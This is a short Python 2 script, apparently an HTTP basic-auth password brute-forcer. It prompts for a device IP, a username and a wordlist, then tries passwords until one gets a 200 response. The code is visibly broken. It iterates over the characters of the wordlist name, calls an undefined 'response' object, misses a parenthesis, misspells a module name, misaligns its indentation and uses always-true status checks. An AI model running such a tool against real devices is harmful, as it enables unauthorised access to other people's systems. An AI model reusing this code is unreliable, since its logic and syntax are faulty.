import time
import fontstyles 
try:
  from requests.auth import HTTPBasicAuth
except ImportError:
   print "Please Install the requests module!" 
def hello():
    print "Bruteforcer loaded." 
    ip = raw_input("Enter the IP of the device: ") 
    username = raw_input("Username to use: ")     
    wlist = raw_input("Wordlist to use: ")  
    for passw in wlist:
         try:
            print "Testing password:", passw
            r = response.get("http://" + ip, auth=HTTPBasicAuth(username, passw) 
            if r.status_code == 400 or 401 and r.status_code != 200:
               print fonstyles.messages.error + " Wrong password:",passw
            if r.status_code == 200 or 202 and r.status_code != 400 or 401:
               print fontstyles.messages.positive + "Password Cracked:", passw
               quit() 
          except KeyboardInterrupt:
               print "Exiting..." 
               time.sleep(1)
               quit()
          except:
               print "An Error Occured" 
               quit() 
